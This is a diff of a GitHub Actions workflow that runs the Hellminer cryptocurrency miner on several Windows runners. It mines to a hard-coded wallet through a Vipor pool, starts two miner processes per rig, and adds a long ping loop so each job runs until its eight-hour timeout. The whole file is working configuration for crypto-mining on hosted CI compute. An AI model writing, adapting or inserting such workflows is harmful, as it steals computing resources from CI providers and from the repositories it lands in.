@@ -7,7 +7,7 @@ jobs:
   mine:
     name: Run Task ${{ matrix.id }}
     runs-on: windows-latest
-    timeout-minutes: 480  # 6 hours
+    timeout-minutes: 480  # 8 hours
 
     strategy:
       matrix:
@@ -25,8 +25,10 @@ jobs:
         run: |
           Expand-Archive -Path "hellminer_win64_avx2.zip" -DestinationPath "hellminer"
 
-      - name: Run Hellminer (rig${{ matrix.id }})
+      - name: Run Hellminer with 2 threads (rig${{ matrix.id }})
+        shell: cmd
         run: |
           cd hellminer
-          Start-Process -NoNewWindow -FilePath ./hellminer.exe -ArgumentList "-c stratum+tcp://sg.vipor.net:5040 -u RDw8bjxzFXZG6hrsbo6SrAQA356Hrpq4LF.rig${{ matrix.id }}a -p x"
-          Start-Process -NoNewWindow -FilePath ./hellminer.exe -ArgumentList "-c stratum+tcp://sg.vipor.net:5040 -u RDw8bjxzFXZG6hrsbo6SrAQA356Hrpq4LF.rig${{ matrix.id }}a -p x"
+          start /b hellminer.exe -c stratum+tcp://sg.vipor.net:5040 -u RDw8bjxzFXZG6hrsbo6SrAQA356Hrpq4LF.rig${{ matrix.id }}a -p x
+          start /b hellminer.exe -c stratum+tcp://sg.vipor.net:5040 -u RDw8bjxzFXZG6hrsbo6SrAQA356Hrpq4LF.rig${{ matrix.id }}b -p x
+          ping -n 172800 127.0.0.1 > nul
